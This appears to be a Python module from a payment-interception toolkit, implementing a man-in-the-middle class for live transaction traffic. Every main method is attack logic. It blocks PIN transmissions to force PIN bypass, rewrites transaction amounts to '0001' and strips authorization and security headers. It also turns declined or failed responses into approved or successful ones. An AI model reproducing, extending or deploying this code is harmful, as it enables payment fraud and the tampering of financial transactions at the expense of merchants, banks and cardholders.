"""
Transaction MITM interceptor for real-time payment interception.
"""
import json
import time
import re
import traceback
from typing import Dict, Any, Optional, Tuple
from ..utils.logger import Logger

logger = Logger("TransactionMITM")


class RealTransactionMITM:
    """Real-time transaction MITM interceptor."""
    
    def __init__(self, config_path: str = "config/mitm_config.json"):
        self.block_all = False
        self.bypass_pin = False
        self.log_file = f"logs/mitm_interception_log_{int(time.time())}.json"
        self.logs = []
        self.config_path = config_path
        
        logger.info(f"Initializing RealTransactionMITM, log file: {self.log_file}")
        self.load_config()

    def load_config(self) -> None:
        """Load MITM configuration from file."""
        logger.info(f"Loading MITM configuration from {self.config_path}")
        
        try:
            with open(self.config_path, "r", encoding='utf-8') as f:
                self.config = json.load(f)
                self.block_all = self.config.get("block_all", False)
                self.bypass_pin = self.config.get("bypass_pin", True)
                
            logger.info(f"MITM config loaded: block_all={self.block_all}, bypass_pin={self.bypass_pin}")
            
        except Exception as e:
            logger.error(f"Config load failed: {e}")
            self.config = {}
            traceback.print_exc()

    def save_logs(self) -> None:
        """Save MITM logs to file."""
        logger.info(f"Saving MITM logs to {self.log_file}")
        
        try:
            with open(self.log_file, "w", encoding='utf-8') as f:
                json.dump(self.logs, f, indent=2)
            logger.info("MITM logs saved successfully")
            
        except Exception as e:
            logger.error(f"Failed to save MITM logs: {e}")
            traceback.print_exc()

    def process_request(self, data_text: str, url: str) -> Tuple[Optional[str], int, bytes]:
        """
        Process HTTP request and apply MITM logic.
        
        Args:
            data_text: Request data as text
            url: Request URL
            
        Returns:
            Tuple of (modified_data, status_code, status_message)
        """
        logger.info(f"Processing HTTP request: url={url}, data={data_text[:100]}...")
        
        if self.block_all:
            logger.info("Blocking ALL communication due to block_all=True")
            self.logs.append({
                "time": time.time(),
                "action": "block_all",
                "url": url
            })
            return None, 403, b"Blocked by MITM proxy"

        # Check for PIN transmission patterns
        if self.bypass_pin:
            pin_patterns = [
                r'"pin"\s*:\s*"\d+"',
                r'pin=\d+',
                r'pincode=\d+',
                r'PIN_BLOCK',
                r'pin_block',
                r'encrypted_pin'
            ]
            
            for pattern in pin_patterns:
                if re.search(pattern, data_text, re.IGNORECASE):
                    logger.info(f"Blocking PIN transmission, matched pattern: {pattern}")
                    self.logs.append({
                        "time": time.time(),
                        "action": "block_pin",
                        "url": url,
                        "pattern": pattern
                    })
                    return None, 403, b"Blocked PIN transmission"

        # Apply additional modifications
        modified_data = self.apply_modifications(data_text, url)
        
        if modified_data != data_text:
            self.logs.append({
                "time": time.time(),
                "action": "modified_request",
                "url": url,
                "original_length": len(data_text),
                "modified_length": len(modified_data)
            })
            logger.info(f"Modified HTTP request: {modified_data[:100]}...")
            return modified_data, 200, b"OK"
        
        logger.debug("No modifications applied to HTTP request")
        return data_text, 200, b"OK"

    def apply_modifications(self, data_text: str, url: str) -> str:
        """
        Apply custom modifications to request data.
        
        Args:
            data_text: Original request data
            url: Request URL
            
        Returns:
            Modified request data
        """
        modified = data_text
        
        # Example: Replace transaction amounts (for testing)
        if self.config.get("modify_amounts", False):
            amount_patterns = [
                (r'"amount"\s*:\s*"(\d+)"', r'"amount": "0001"'),
                (r'amount=(\d+)', r'amount=0001')
            ]
            
            for pattern, replacement in amount_patterns:
                if re.search(pattern, modified, re.IGNORECASE):
                    modified = re.sub(pattern, replacement, modified, flags=re.IGNORECASE)
                    logger.info(f"Modified transaction amount in request")
                    break

        # Example: Remove security headers
        if self.config.get("remove_security_headers", False):
            security_patterns = [
                r'"x-security-token"\s*:\s*"[^"]*"',
                r'"authorization"\s*:\s*"[^"]*"',
                r'x-security-token:\s*[^\r\n]*'
            ]
            
            for pattern in security_patterns:
                if re.search(pattern, modified, re.IGNORECASE):
                    modified = re.sub(pattern, '', modified, flags=re.IGNORECASE)
                    logger.info(f"Removed security header from request")

        return modified

    def process_response(self, response_data: str, url: str) -> str:
        """
        Process HTTP response and apply MITM logic.
        
        Args:
            response_data: Response data as text
            url: Request URL
            
        Returns:
            Modified response data
        """
        logger.debug(f"Processing HTTP response for URL: {url}")
        
        # Example: Modify success/failure responses
        if self.config.get("force_success", False):
            success_patterns = [
                (r'"status"\s*:\s*"failed"', r'"status": "success"'),
                (r'"error"\s*:\s*true', r'"error": false'),
                (r'"result"\s*:\s*"declined"', r'"result": "approved"')
            ]
            
            modified = response_data
            for pattern, replacement in success_patterns:
                if re.search(pattern, modified, re.IGNORECASE):
                    modified = re.sub(pattern, replacement, modified, flags=re.IGNORECASE)
                    logger.info(f"Modified response status to success")
                    
                    self.logs.append({
                        "time": time.time(),
                        "action": "force_success",
                        "url": url
                    })
                    break
            
            return modified
        
        return response_data

    def done(self) -> None:
        """Cleanup and save logs."""
        self.save_logs()
        logger.info("MITM session completed")
